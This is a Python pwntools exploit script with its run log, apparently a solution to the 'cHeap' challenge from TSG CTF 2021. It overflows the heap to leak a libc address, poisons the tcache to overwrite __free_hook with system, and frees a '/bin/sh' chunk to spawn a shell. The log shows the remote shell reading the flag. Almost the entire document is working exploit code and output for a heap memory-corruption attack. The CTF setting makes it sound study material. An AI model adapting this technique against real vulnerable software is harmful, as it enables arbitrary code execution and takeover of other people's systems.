from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './cheap'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "34.146.101.4"
  PORT = 30001
  s = remote(HOST, PORT)
  libc = ELF("./libc.so.6")
else:
  s = process(BINARY)
  #s = process(BINARY, env={'LD_PRELOAD': './libc.so.6'})
  libc = elf.libc
  #libc = ELF("./libc.so.6")

def Create(size, data):
  s.sendlineafter("Choice: ", "1")
  s.sendlineafter("size: ", str(size))
  s.sendlineafter("data: ", data) 
  
def Show():
  s.sendlineafter("Choice: ", "2") 

def Remove():
  s.sendlineafter("Choice: ", "3") 

# libc leak
Create(0x40,   b"a"*0x48+p64(0xd21))
Remove()
Create(0x1000, b"b"*0x10)
Create(0x50,   b"c"*0x10)
Remove()
Create(0x3c0,  b"d"*0x10)
Create(0x40,   b"e"*0x48+p64(0x431))
Create(0x50,   b"f"*0x10)
Remove()
Show()
libc_leak = u64(s.recvuntil("\n")[:-1]+b"\x00"*2)
libc_base = libc_leak - libc.sym.__malloc_hook - 0x70
free_hook = libc_base + libc.sym.__free_hook
system_addr = libc_base + libc.sym.system
print("libc_leak =", hex(libc_leak))
print("libc_base =", hex(libc_base))

Create(0x30,   b"g"*0x10)
Remove()
Create(0x40,   b"h"*0x10)
Remove()
Create(0x50,   b"i"*0x10)
Remove()

# tcache poisoning 
Create(0x40,   b"j"*0x48+p64(0x51))
Remove()
Create(0x50,   b"k"*0x10)
Remove()
Create(0x30,   b"l"*0x38+p64(0x51)+p64(0)+b"m"*0x40+p64(0x51)+p64(free_hook))

# Write system address in __free_hook
Create(0x40,   b"n"*0x10)
Create(0x40,   p64(system_addr))

# Start /bin/sh
Create(0x10,   b"/bin/sh\x00")
Remove()

s.interactive()

'''
mito@ubuntu:~/CTF/TSG_CTF_2021/Pwn_cHeap/cheap$ python3 solve.py r
[*] '/home/mito/CTF/TSG_CTF_2021/Pwn_cHeap/cheap/cheap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 34.146.101.4 on port 30001: Done
[*] '/home/mito/CTF/TSG_CTF_2021/Pwn_cHeap/cheap/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
libc_leak = 0x7fa4b8ad2be0
libc_base = 0x7fa4b88e7000
[*] Switching to interactive mode
$ id 
uid=999(user) gid=999(user) groups=999(user)
$ ls -l
total 2012
-r-xr-xr-x 1 root user   17408 Oct  2 04:02 cheap
-r--r--r-- 1 root user      45 Oct  2 04:02 flag
-r-xr-xr-x 1 root user 2029224 Oct  2 04:02 libc.so.6
-r-xr-xr-x 1 root user      56 Oct  2 04:02 start.sh
$ cat flag
TSGCTF{Heap_overflow_is_easy_and_nice_yeyey}
'''

